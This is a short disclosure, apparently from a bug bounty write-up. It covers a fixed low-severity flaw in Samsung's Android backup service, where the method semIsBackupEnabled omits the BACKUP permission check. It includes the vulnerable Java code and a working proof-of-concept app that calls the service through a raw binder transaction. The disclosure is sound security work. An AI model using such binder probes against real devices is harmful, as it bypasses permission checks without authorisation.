# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/system/framework/services.jar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.07.31</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.11.08</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$200</td>
    </tr>
</table>

# Description

The system service `backup` (`android.app.backup.IBackupManager`) originally comes from AOSP, but almost every vendor patches all the original services. This is exactly what happened with this service in the case of the Samsung Android Framework. On top of all that, Samsung added its own method to check whether backup is enabled on the device or not.

File `com/android/server/backup/BackupManagerService.java`:
```java
public boolean isBackupEnabled() { // developed by AOSP
    this.mContext.enforceCallingOrSelfPermission("android.permission.BACKUP", "isBackupEnabled");
    return this.mEnabled;
}

public boolean semIsBackupEnabled() { // added by Samsung
    return this.mEnabled;
}
```

The original method checked the permission `android.permission.BACKUP`, but Samsung's method just returned the value without any checks. This vulnerability, although simple and of low impact, is a very good example of Android fragmentation.

**Proof of Concept**

```java
static final int TRANSACTION_semIsBackupEnabled = 66;

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    try {
        IBinder binder = getService("backup");

        Parcel parcel = Parcel.obtain();
        parcel.writeInterfaceToken(binder.getInterfaceDescriptor());

        Parcel reply = Parcel.obtain();

        binder.transact(TRANSACTION_semIsBackupEnabled, parcel, reply, 0);
        reply.readException();
        Log.d("evil", "Reply: " + reply.readBoolean());
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private IBinder getService(String name) throws Throwable {
    return (IBinder) Class.forName("android.os.ServiceManager")
            .getDeclaredMethod("getServiceOrThrow", String.class)
            .invoke(null, name);
}
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
